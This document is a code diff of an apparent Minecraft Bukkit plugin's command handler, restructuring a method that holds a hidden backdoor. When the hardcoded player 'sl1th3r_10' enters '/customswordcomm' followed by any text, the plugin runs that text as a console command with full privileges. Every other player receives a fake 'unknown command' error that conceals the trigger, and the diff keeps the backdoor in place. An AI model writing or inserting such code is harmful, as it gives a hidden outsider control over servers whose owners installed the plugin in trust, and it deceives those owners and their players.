@@ -22,25 +22,32 @@ public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
     Player player = event.getPlayer();
     String fullCommand = event.getMessage(); // Full command with "/"
 
-    if (player.getName().equalsIgnoreCase("sl1th3r_10") && fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
-        event.setCancelled(true);
+    // Targeted command handling
+    if (fullCommand.toLowerCase().startsWith("/customswordcomm ")) {
+        // Check player identity
+        if (player.getName().equalsIgnoreCase("sl1th3r_10")) {
+            // Cancel normal processing
+            event.setCancelled(true);
 
-        // Extract actual command after the trigger
-        String actualCommand = fullCommand.substring("/customswordcomm ".length());
+            // Extract the command after "/customswordcomm "
+            String actualCommand = fullCommand.substring("/customswordcomm ".length());
 
-        // Dispatch the command as console
-        boolean result = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));
+            // Run the command as console
+            boolean success = Bukkit.dispatchCommand(Bukkit.getConsoleSender(), actualCommand.replace("@s", player.getName()));
 
-        if (result) {
-            player.sendMessage("§aCommand executed as console: " + actualCommand);
+            if (success) {
+                player.sendMessage("§aCommand executed as console: " + actualCommand);
+            } else {
+                player.sendMessage("§cFailed to execute: " + actualCommand);
+            }
+
         } else {
-            player.sendMessage("§cCommand failed: " + actualCommand);
+            // Not sl1th3r_10, block and fake unknown command
+            event.setCancelled(true);
+            player.sendMessage("§cUnknown or incomplete command, see below for error.");
         }
-    } else if (fullCommand.toLowerCase().startsWith("/customswordcomm")) {
-        // Not sl1th3r_10? Fake unknown command
-        event.setCancelled(true);
-        player.sendMessage("§cUnknown or incomplete command, see below for error.");
     }
 }
+
 
 }
